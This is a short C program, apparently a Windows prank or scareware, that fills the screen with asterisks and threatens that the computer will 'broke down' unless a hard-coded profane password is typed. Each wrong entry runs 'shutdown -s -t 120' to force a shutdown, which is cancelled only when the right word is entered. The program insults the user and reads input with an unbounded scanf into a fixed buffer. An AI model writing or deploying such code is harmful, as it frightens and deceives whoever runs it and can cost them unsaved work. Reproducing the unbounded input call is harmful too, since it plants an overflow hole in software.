#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int main(void)
{
    char ch[500];
    int j = 10;
    for (int i = 0; i < 5000; i++)
    {
        putchar('*');
        if (i % 100 == 99)
            putchar('\n');
        usleep(200);
    }
    printf("\nPlease enter password.\nIf wrong, your computer will broke down! You have only 120 seconds!\n");
    scanf("%s", ch);
    while (strcmp(ch, "FUCK") != 0)
    {
        for (int i = 0; i < 5000 + j * 300; i++)
        {
            putchar('*');
            usleep(100 + j);
        }
        system("shutdown -s -t 120");
        printf("\nWrong! Retry.\n");
        j += 10;
        scanf("%s", ch);
    }
    if(j != 10)
    system("shutdown -a");
    else
    printf("Fuck you!\n");

    system("pause");

    return 0;
}